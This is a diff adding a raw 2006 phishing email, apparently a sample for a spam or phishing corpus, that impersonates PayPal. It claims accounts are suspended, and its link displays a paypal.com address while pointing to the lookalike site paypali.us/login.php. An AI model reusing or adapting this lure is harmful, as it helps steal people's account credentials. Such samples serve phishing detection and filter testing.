@@ -1,0 +1,98 @@
+Return-Path: <service@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 5DE5446AB6;
+	Fri,  1 Sep 2006 04:11:30 -0400 (EDT)
+Received: from 192.168.22.6 (host217-34-1-162.in-addr.btopenworld.com [217.34.1.162])
+	by mail.example.org (Postfix) with SMTP id F19236FA5BD;
+	Fri,  1 Sep 2006 04:11:28 -0400 (EDT)
+Received: from 188.32.27.92 by ; Fri, 01 Sep 2006 14:08:28 +0500
+Message-ID: <AFAJGQMDTCALFKLCKYJOOYEQN@paypal.com>
+From: "service.idPP364@paypal.com " <service@paypal.com>
+Reply-To: "service.idPP364@paypal.com " <service@paypal.com>
+To: evan.cordes@example.com
+Subject: Account Notification. Your Online Account Needs Re-activation
+Date: Fri, 01 Sep 2006 14:08:28 +0500
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--4600591757259414"
+X-Priority: 1
+X-MSMail-Priority: High
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 172
+
+----4600591757259414
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+ <body>
+
+<div style=3D"width: 586px; margin: 1 auto 1 auto; border: 1px dashed blue=
+; padding: 14px 14px 14px 14px; font-size:78%;">
+<p style=3D"font-weight: bold; color: #072510; font-family: verdana;" ><fo=
+nt face=3D"verdana" style=3D"font-size: 9pt">Dear member,</p>
+<p style=3D"font-weight: bold; color: #072510; font-family: verdana;" alig=
+n=3D"justify"><font face=3D"verdana" style=3D"font-size: 9pt">As the Inter=
+net and information technology enable us to expand our services, we are co=
+mmitted to maintaining the trust customers have placed in us for protectin=
+g the privacy and security of information we have about you. <br>In order =
+to protect your information against unauthorized access, identity theft an=
+d account fraud we earnestly ask you to update your profile.</p>
+<p style=3D"font-weight: bold; color: #072510; font-family: verdana;" alig=
+n=3D"justify"><font face=3D"verdana" style=3D"font-size: 9pt">Currently we=
+ are trying to upgrade our on-line security measures. <br>All accounts hav=
+e been temp<font face=3D"verdana" style=3D"font-size: 9pt">orarly suspende=
+d untill each person completes our secure online form. <br>For this operat=
+ion<font face=3D"verdana" style=3D"font-size: 9pt"> you will be required t=
+o pass trough a series of authentications.</p>
+
+<p align=3D"justify"><font face=3D"Arial" style=3D"font-size: 9pt">Please =
+login, authenticate and update your PayPal account by checking the link be=
+low:</font></p>
+		<div style=3D"border: 1px solid red; margin: 0px; padding-left: 0px; pad=
+ding-right: 5px; padding-top: 0px; padding-bottom: 2px; background-color: =
+rgb(242, 242, 225)">
+			<p style=3D"color: rgb(7, 69, 128); font-family: Arial; margin: 0px; pa=
+dding: 0px">
+			<span style=3D"font-size: 9pt">&nbsp;&nbsp;&nbsp;
+			<a href=3D"http://www.paypali.us/login.php">
+			https://www.paypal.com/cgi-bin/webscr?cmd=3D_login-run</a></span></div>=
+
+<br><font face=3D"Arial" style=3D"font-size: 10pt">Thank you for your prom=
+pt attention to this matter.<br><br><p style=3D"font-weight: bold; color: =
+red; font-family: verdana;" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;REMEMBER!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REMEMBER! &nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;REMEMBER!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REMEMBER!&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;REMEMBER!</p><font face=3D"Arial" style=3D"font-size: 10pt">We=
+ are always ready to help you.<br> Whether you need account assistance or =
+answers to financial questions we are here for you. <br>Send us an email, =
+call or write us.<br> You may also try our online help files. 
+<br>
+<br></b>Email us at: onlineservice@paypal.com
+<br>Call us at:  800.336.4644
+ or other Customer Service Numbers.
+
+<br><br>
+</FONT></FONT><font size=3D"1" face=3D"Arial, Helvetica, sans-serif" color=
+=3D"#6E6E6E">
+</font></span></td>
+
+
+<div align=3D"left" style=3D"margin-top:     px;MARGIN-BOTTOM: 10px; COLOR=
+: #666666; font-family: verdana; text-align: left; height: 30px">=A9 2006 =
+PayPal. All rights reserved.
+
+</div>
+
+
+		
+</div>
+</body>
+</html>
+
+----4600591757259414--
+
